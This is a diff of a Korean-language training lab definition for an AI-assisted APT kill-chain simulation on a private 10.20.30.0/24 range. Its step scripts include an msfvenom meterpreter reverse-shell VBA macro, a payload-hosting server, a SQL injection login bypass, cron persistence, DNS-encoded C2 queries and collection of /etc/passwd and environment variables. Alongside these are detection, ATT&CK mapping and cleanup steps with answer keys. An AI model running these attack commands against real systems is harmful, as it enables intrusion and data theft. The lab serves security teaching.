@@ -1,9 +1,9 @@
 lab_id: battle-adv-ai-week01
-title: APT 시뮬레이션 기초 — 지능형 지속 위협 공격 체인
+title: APT 시뮬레이션 기초 — 지능형 지속 위협 공격 체인 (AI 지원)
 version: ai
 course: battle-adv-ai
 week: 1
-description: APT(Advanced Persistent Threat) 공격의 전체 킬체인을 이해하고, 각 단계별 기법을 수동으로 시뮬레이션하며 탐지 포인트를 식별한다. MITRE ATT&CK 프레임워크 기반으로 공격 체인을 매핑하고 방어 전략을 수립한다.
+description: APT(Advanced Persistent Threat) 공격의 전체 킬체인을 이해하고, 각 단계별 기법을 수동으로 시뮬레이션하며 탐지 포인트를 식별한다. MITRE ATT&CK 프레임워크 기반으로 공격 체인을 매핑하고 방어 전략을 수립한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
 difficulty: hard
 duration_minutes: 150
 objectives:
@@ -24,9 +24,8 @@ steps:
   verify:
     type: output_contains
     expect: initial
-  script: 'result = await agent.run("curl -s https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/intrusion-set/intrusion-set--899ce53f-13a0-...")
-
-    await agent.analyze(result, "정찰 결과를 분석하고 공격 표면을 매핑하라")'
+  script: curl -s https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/intrusion-set/intrusion-set--899ce53f-13a0-479b-a0e4-67d46e241542.json | python3 -m json.tool | grep -i 'initial access'
+  risk_level: low
 - order: 2
   instruction: Nmap을 이용하여 타겟 네트워크 10.20.30.0/24에서 서비스 배너와 OS를 동시에 탐지하라. 스텔스 스캔(-sS)과 서비스 버전 탐지(-sV)를 결합하라.
   hint: -sS -sV -O 옵션을 조합하고, --script=banner도 추가한다.
@@ -37,9 +36,8 @@ steps:
   verify:
     type: output_contains
     expect: open
-  script: 'result = await agent.run("nmap -sS -sV -O --script=banner -T3 10.20.30.0/24 -oX /tmp/apt_recon.xml...")
-
-    await agent.analyze(result, "정찰 결과를 분석하고 공격 표면을 매핑하라")'
+  script: nmap -sS -sV -O --script=banner -T3 10.20.30.0/24 -oX /tmp/apt_recon.xml
+  risk_level: low
 - order: 3
   instruction: 수집된 정보를 기반으로 타겟 10.20.30.80의 웹 서버에 대해 웹 취약점 스캔을 수행하라. nikto를 사용하여 알려진 취약점을 식별하라.
   hint: nikto -h 옵션으로 타겟 호스트를 지정하고, -output으로 결과를 저장한다.
@@ -50,9 +48,8 @@ steps:
   verify:
     type: output_contains
     expect: nikto
-  script: 'result = await agent.run("nikto -h http://10.20.30.80 -output /tmp/nikto_scan.txt -Format txt...")
-
-    await agent.analyze(result, "정찰 결과를 분석하고 공격 표면을 매핑하라")'
+  script: nikto -h http://10.20.30.80 -output /tmp/nikto_scan.txt -Format txt
+  risk_level: low
 - order: 4
   instruction: Spearphishing 이메일에 첨부할 악성 Office 문서를 시뮬레이션하라. msfvenom으로 reverse shell 페이로드가 포함된 VBA 매크로를 생성하라. (교육 목적 - 실제 전송 금지)
   hint: msfvenom -p windows/meterpreter/reverse_tcp 옵션으로 VBA 매크로 형태를 생성한다.
@@ -63,11 +60,8 @@ steps:
   verify:
     type: output_contains
     expect: vba
-  script: 'plan = await agent.plan("공격 기법: Spearphishing 이메일에 첨부할 악성 Office 문서를 시뮬레이션하라. msfvenom으로 reverse shell 페이로드가 포함된")
-
-    result = await agent.execute(plan)
-
-    await agent.evaluate(result, "공격 성공 여부와 다음 단계를 판단하라")'
+  script: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f vba -o /tmp/apt_macro.vba
+  risk_level: medium
 - order: 5
   instruction: Delivery 단계를 시뮬레이션하기 위해 간이 피싱 서버를 구축하라. Python http.server로 페이로드 호스팅 서버를 만들고, 접속 로그를 기록하라.
   hint: python3 -m http.server로 서버를 실행하고, 특정 디렉토리를 서빙한다.
@@ -78,11 +72,8 @@ steps:
   verify:
     type: output_contains
     expect: '8888'
-  script: 'plan = await agent.plan("공격 기법: Delivery 단계를 시뮬레이션하기 위해 간이 피싱 서버를 구축하라. Python http.server로 페이로드 호스팅 서버를 만들고, 접속")
-
-    result = await agent.execute(plan)
-
-    await agent.evaluate(result, "공격 성공 여부와 다음 단계를 판단하라")'
+  script: mkdir -p /tmp/phishing_sim && cp /tmp/apt_macro.vba /tmp/phishing_sim/ && cd /tmp/phishing_sim && python3 -m http.server 8888 --bind 10.20.30.201 > /tmp/phishing_access.log 2>&1 &
+  risk_level: medium
 - order: 6
   instruction: Exploitation 단계를 시뮬레이션하라. 타겟 웹 서버 10.20.30.80에서 발견된 취약점을 이용하여 초기 접근을 확보하라. curl을 이용한 SQL Injection 테스트를 수행하라.
   hint: OWASP JuiceShop의 로그인 엔드포인트에 SQL Injection을 시도한다.
@@ -93,11 +84,8 @@ steps:
   verify:
     type: output_contains
     expect: token
-  script: 'plan = await agent.plan("공격 기법: Exploitation 단계를 시뮬레이션하라. 타겟 웹 서버 10.20.30.80에서 발견된 취약점을 이용하여 초기 접근을 확보하라. curl을")
-
-    result = await agent.execute(plan)
-
-    await agent.evaluate(result, "공격 성공 여부와 다음 단계를 판단하라")'
+  script: 'curl -s -X POST http://10.20.30.80/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"test"}'' | python3 -m json.tool'
+  risk_level: medium
 - order: 7
   instruction: Installation(Persistence) 단계를 시뮬레이션하라. 타겟 시스템에서 crontab을 이용한 지속성 확보 기법을 테스트하라. (로컬 실습)
   hint: crontab에 리버스 쉘 명령을 등록하는 방식으로 시뮬레이션한다.
@@ -108,11 +96,8 @@ steps:
   verify:
     type: output_contains
     expect: APT_PERSISTENCE
-  script: 'plan = await agent.plan("공격 기법: Installation(Persistence) 단계를 시뮬레이션하라. 타겟 시스템에서 crontab을 이용한 지속성 확보 기법을 테스트하라. (")
-
-    result = await agent.execute(plan)
-
-    await agent.evaluate(result, "공격 성공 여부와 다음 단계를 판단하라")'
+  script: echo '*/5 * * * * /bin/bash -c "echo APT_PERSISTENCE_TEST > /tmp/apt_persist.txt"' | crontab -
+  risk_level: medium
 - order: 8
   instruction: C2(Command & Control) 채널을 시뮬레이션하라. DNS 기반 C2 통신을 모방하여, nslookup으로 인코딩된 데이터를 DNS 쿼리에 포함하여 전송하는 원리를 테스트하라.
   hint: base64로 데이터를 인코딩한 후 서브도메인으로 구성하여 DNS 쿼리를 보낸다.
@@ -123,11 +108,8 @@ steps:
   verify:
     type: output_contains
     expect: QVBU
-  script: 'plan = await agent.plan("공격 기법: C2(Command & Control) 채널을 시뮬레이션하라. DNS 기반 C2 통신을 모방하여, nslookup으로 인코딩된 데이터를 DNS ")
-
-    result = await agent.execute(plan)
-
-    await agent.evaluate(result, "공격 성공 여부와 다음 단계를 판단하라")'
+  script: echo 'APT_C2_DATA' | base64 | tr -d '=' | xargs -I{} nslookup {}.test.local 2>&1 | head -5
+  risk_level: medium
 - order: 9
   instruction: Actions on Objectives 단계를 시뮬레이션하라. 타겟 시스템에서 민감 데이터를 수집하는 과정을 테스트하라. /etc/passwd, 환경변수, 네트워크 설정을 수집하여 하나의 파일로 만들어라.
   hint: cat, env, ip addr 명령의 출력을 하나의 파일로 리다이렉트한다.
@@ -138,11 +120,8 @@ steps:
   verify:
     type: output_contains
     expect: /tmp/apt_exfil.txt
-  script: 'plan = await agent.plan("공격 기법: Actions on Objectives 단계를 시뮬레이션하라. 타겟 시스템에서 민감 데이터를 수집하는 과정을 테스트하라. /etc/passwd,")
-
-    result = await agent.execute(plan)
-
-    await agent.evaluate(result, "공격 성공 여부와 다음 단계를 판단하라")'
+  script: cat /etc/passwd > /tmp/apt_exfil.txt && env >> /tmp/apt_exfil.txt && ip addr >> /tmp/apt_exfil.txt && wc -l /tmp/apt_exfil.txt
+  risk_level: medium
 - order: 10
   instruction: APT 킬체인의 각 단계에서 발생하는 로그를 분석하라. /var/log/auth.log에서 비정상 인증 시도 패턴을 찾아라.
   hint: grep으로 Failed, Accepted, session opened 등의 패턴을 검색한다.
@@ -153,11 +132,8 @@ steps:
   verify:
     type: output_contains
     expect: session
-  script: 'alerts = await agent.monitor("보안 이벤트 수집 및 분석")
-
-    response = await agent.respond(alerts, "탐지된 위협에 대한 최적 대응 조치를 실행하라")
-
-    await agent.log(response, "방어 조치 기록")'
+  script: grep -E '(Failed|Accepted|session opened|session closed|Invalid user)' /var/log/auth.log | tail -30
+  risk_level: low
 - order: 11
   instruction: Suricata IDS에서 APT 관련 탐지 규칙을 확인하라. 10.20.30.1의 Suricata 규칙 파일에서 APT, C2, exfiltration 관련 시그니처를 검색하라.
   hint: Suricata 규칙 디렉토리(/etc/suricata/rules/)에서 관련 키워드를 검색한다.
@@ -168,11 +144,8 @@ steps:
   verify:
     type: output_contains
     expect: alert
-  script: 'alerts = await agent.monitor("보안 이벤트 수집 및 분석")
-
-    response = await agent.respond(alerts, "탐지된 위협에 대한 최적 대응 조치를 실행하라")
-
-    await agent.log(response, "방어 조치 기록")'
+  script: ssh 10.20.30.1 'grep -rn -i "apt\|c2\|exfil\|cozy\|beacon" /etc/suricata/rules/ 2>/dev/null | head -20'
+  risk_level: low
 - order: 12
   instruction: MITRE ATT&CK Navigator를 이용하여 이번 실습에서 사용한 기법들을 매핑하라. JSON 형태로 ATT&CK 레이어 파일을 생성하라.
   hint: ATT&CK Navigator의 레이어 JSON 포맷에 맞춰 technique_id와 score를 지정한다.
@@ -191,89 +164,81 @@ steps:
   verify:
     type: output_contains
     expect: enterprise-attack
-  script: 'data = await agent.collect("분석 데이터 수집")
+  script: 'cat > /tmp/apt_attack_layer.json << ''EOF''
 
-    analysis = await agent.analyze(data, "MITRE ATT&CK Navigator를 이용하여 이번 실습에서 사용한 기법들을 매핑하라. JSON 형태로 ATT&CK 레이어 파일을 생성하라")
-
-    await agent.report(analysis, "분석 보고서 생성")'
-- order: 13
-  instruction: APT 시뮬레이션 과정에서 생성된 IoC(Indicator of Compromise)를 정리하라. IP, 해시, 파일 경로, 프로세스 등의 IoC를 STIX 2.1 형태로 기록하라.
-  hint: STIX indicator 객체 형태의 JSON을 생성한다.
-  category: analysis
-  points: 10
-  answer: 'cat > /tmp/apt_ioc_stix.json << ''EOF''
-
-    {"type":"bundle","id":"bundle--apt-sim-001","objects":[{"type":"indicator","id":"indicator--001","name":"APT Sim Phishing Server","pattern":"[ipv4-addr:value = ''10.20.30.201'' AND network-traffic:dst_port
-    = 8888]","pattern_type":"stix","valid_from":"2026-04-03T00:00:00Z"},{"type":"indicator","id":"indicator--002","name":"APT Sim Persistence","pattern":"[file:name = ''apt_persist.txt'']","pattern_type":"stix","valid_from":"2026-04-03T00:00:00Z"},{"type":"indicator","id":"indicator--003","name":"APT
-    Sim Exfil Data","pattern":"[file:name = ''apt_exfil.txt'']","pattern_type":"stix","valid_from":"2026-04-03T00:00:00Z"}]}
+    {"name":"APT Simulation Lab","versions":{"attack":"14","navigator":"4.9","layer":"4.5"},"domain":"enterprise-attack","techniques":[{"techniqueID":"T1595","score":1,"comment":"Active Scanning"},{"techniqueID":"T1566.001","score":1,"comment":"Spearphishing
+    Attachment"},{"techniqueID":"T1190","score":1,"comment":"Exploit Public-Facing App"},{"techniqueID":"T1053.003","score":1,"comment":"Cron Persistence"},{"techniqueID":"T1071.004","score":1,"comment":"DNS
+    C2"},{"techniqueID":"T1005","score":1,"comment":"Data from Local System"}]}
 
     EOF
 
-    cat /tmp/apt_ioc_stix.json | python3 -m json.tool | head -10'
-  answer_detail: IoC(침해 지표)는 APT 탐지와 공유의 핵심 자산이다. STIX(Structured Threat Information eXpression) 2.1은 사이버 위협 인텔리전스를 구조화하는 표준이다. indicator 객체에 STIX 패턴으로 IoC를 기술하면 다른 보안 도구와 호환 가능하다.
-  verify:
-    type: output_contains
-    expect: bundle
-  script: 'data = await agent.collect("분석 데이터 수집")
-
-    analysis = await agent.analyze(data, "APT 시뮬레이션 과정에서 생성된 IoC(Indicator of Compromise)를 정리하라. IP, 해시, 파일 경로, 프로세스 등의 Io")
-
-    await agent.report(analysis, "분석 보고서 생성")'
-- order: 14
-  instruction: 실습 환경을 정리하라. 시뮬레이션 과정에서 설치한 Persistence 메커니즘(crontab)을 제거하고, 생성된 임시 파일과 프로세스를 정리하라.
-  hint: crontab -r로 크론탭을 초기화하고, 백그라운드 HTTP 서버를 종료한다.
-  category: response
-  points: 5
-  answer: crontab -r 2>/dev/null; kill $(lsof -ti:8888) 2>/dev/null; rm -f /tmp/apt_*.txt /tmp/apt_*.vba /tmp/apt_*.json /tmp/phishing_sim/* 2>/dev/null; echo 'Cleanup completed'
-  answer_detail: APT 시뮬레이션 후에는 반드시 환경을 원래 상태로 복원해야 한다. Persistence 메커니즘 제거, 임시 파일 삭제, 백그라운드 프로세스 종료를 수행한다. 실제 침해 대응에서도 동일한 정리 작업이 필수적이다.
-  verify:
-    type: output_contains
-    expect: Cleanup completed
-  script: 'incident = await agent.detect("인시던트 탐지 및 분류")
-
-    actions = await agent.contain(incident, "격리 및 증거 수집")
-
-    await agent.report(actions, "대응 결과 보고")'
-- order: 15
-  instruction: 이번 APT 시뮬레이션 실습의 킬체인 분석 보고서를 작성하라. 각 단계에서 사용한 기법, MITRE ATT&CK 매핑, 탐지 포인트, 방어 권고사항을 포함하라.
-  hint: 킬체인 7단계 × (기법 + ATT&CK ID + 탐지 방법 + 방어 권고) 형태로 정리한다.
+    cat /tmp/apt_attack_layer.json | python3 -m json.tool'
+  risk_level: low
+- order: 13
+  instruction: 실습 환경을 정리하고 킬체인 분석 보고서를 작성하라. crontab과 임시 파일을 제거한 후, 각 킬체인 단계의 기법, MITRE ATT&CK 매핑, 탐지 포인트를 /tmp/apt_killchain_report.txt에 정리하라.
+  hint: crontab -r로 크론탭을 초기화하고, 킬체인 7단계를 ATT&CK ID와 매핑한다.
   category: analysis
   points: 15
-  answer: 'cat > /tmp/apt_killchain_report.txt << ''EOF''
+  answer: 'crontab -r 2>/dev/null; kill $(lsof -ti:8888) 2>/dev/null; rm -f /tmp/apt_*.txt /tmp/apt_*.vba /tmp/phishing_sim/* 2>/dev/null && cat > /tmp/apt_killchain_report.txt << ''EOF''
 
     === APT Kill Chain Analysis Report ===
 
-    Date: 2026-04-03
+    Date: 2026-04-06
 
     Target: 10.20.30.0/24
 
 
-    1. Reconnaissance (T1595): Nmap SYN+Version scan → 탐지: IDS 포트스캔 규칙 → 방어: 포트 최소화
+    1. Reconnaissance (T1595): Nmap SYN+Version scan -> Detect: IDS port scan rule -> Defend: Minimize ports
 
-    2. Weaponization (T1587): VBA Macro 생성 → 탐지: 샌드박스 분석 → 방어: 매크로 비활성화
+    2. Weaponization (T1587): VBA Macro generation -> Detect: Sandbox analysis -> Defend: Disable macros
 
-    3. Delivery (T1566.001): HTTP 피싱 서버 → 탐지: URL 필터링 → 방어: 이메일 보안 게이트웨이
+    3. Delivery (T1566.001): HTTP phishing server -> Detect: URL filtering -> Defend: Email security gateway
 
-    4. Exploitation (T1190): SQL Injection → 탐지: WAF 로그 → 방어: 파라미터화 쿼리
+    4. Exploitation (T1190): SQL Injection -> Detect: WAF logs -> Defend: Parameterized queries
 
-    5. Installation (T1053.003): Crontab Persistence → 탐지: crontab 모니터링 → 방어: 크론 화이트리스트
+    5. Installation (T1053.003): Crontab Persistence -> Detect: crontab monitoring -> Defend: Cron whitelist
 
-    6. C2 (T1071.004): DNS 기반 C2 → 탐지: DNS 이상 트래픽 → 방어: DNS 필터링
+    6. C2 (T1071.004): DNS-based C2 -> Detect: DNS anomaly -> Defend: DNS filtering
 
-    7. Actions (T1005): 데이터 수집 및 유출 → 탐지: DLP → 방어: 데이터 분류/암호화
+    7. Actions (T1005): Data collection & exfil -> Detect: DLP -> Defend: Data classification
 
 
-    Conclusion: 각 킬체인 단계에서 방어 기회가 존재하며, Defense-in-Depth 전략이 필수적이다.
+    Conclusion: Defense-in-Depth is essential - every kill chain stage offers a detection opportunity.
 
     EOF
 
-    wc -l /tmp/apt_killchain_report.txt'
-  answer_detail: APT 분석 보고서는 킬체인의 각 단계를 구조적으로 정리하여 공격 흐름을 이해하고 방어 전략을 수립하는 데 활용한다. MITRE ATT&CK ID 매핑, 탐지 방법, 방어 권고사항을 포함하여 실무에서 활용 가능한 형태로 작성한다.
+    cat /tmp/apt_killchain_report.txt && echo ''--- Cleanup completed ---'''
+  answer_detail: APT 시뮬레이션 후에는 환경 복원(Persistence 제거, 임시 파일 삭제)과 결과 문서화를 수행한다. 킬체인 각 단계의 ATT&CK 매핑과 탐지/방어 포인트를 정리하여 실무에서 활용 가능한 보고서를 작성한다.
   verify:
     type: output_contains
     expect: Kill Chain Analysis
-  script: 'data = await agent.collect("분석 데이터 수집")
+  script: 'crontab -r 2>/dev/null; kill $(lsof -ti:8888) 2>/dev/null; rm -f /tmp/apt_*.txt /tmp/apt_*.vba /tmp/phishing_sim/* 2>/dev/null && cat > /tmp/apt_killchain_report.txt << ''EOF''
 
-    analysis = await agent.analyze(data, "이번 APT 시뮬레이션 실습의 킬체인 분석 보고서를 작성하라. 각 단계에서 사용한 기법, MITRE ATT&CK 매핑, 탐지 포인트, 방어 권고")
+    === APT Kill Chain Analysis Report ===
 
-    await agent.report(analysis, "분석 보고서 생성")'
+    Date: 2026-04-06
+
+    Target: 10.20.30.0/24
+
+
+    1. Reconnaissance (T1595): Nmap SYN+Version scan -> Detect: IDS port scan rule -> Defend: Minimize ports
+
+    2. Weaponization (T1587): VBA Macro generation -> Detect: Sandbox analysis -> Defend: Disable macros
+
+    3. Delivery (T1566.001): HTTP phishing server -> Detect: URL filtering -> Defend: Email security gateway
+
+    4. Exploitation (T1190): SQL Injection -> Detect: WAF logs -> Defend: Parameterized queries
+
+    5. Installation (T1053.003): Crontab Persistence -> Detect: crontab monitoring -> Defend: Cron whitelist
+
+    6. C2 (T1071.004): DNS-based C2 -> Detect: DNS anomaly -> Defend: DNS filtering
+
+    7. Actions (T1005): Data collection & exfil -> Detect: DLP -> Defend: Data classification
+
+
+    Conclusion: Defense-in-Depth is essential - every kill chain stage offers a detection opportunity.
+
+    EOF
+
+    cat /tmp/apt_killchain_report.txt && echo ''--- Cleanup completed ---'''
+  risk_level: low
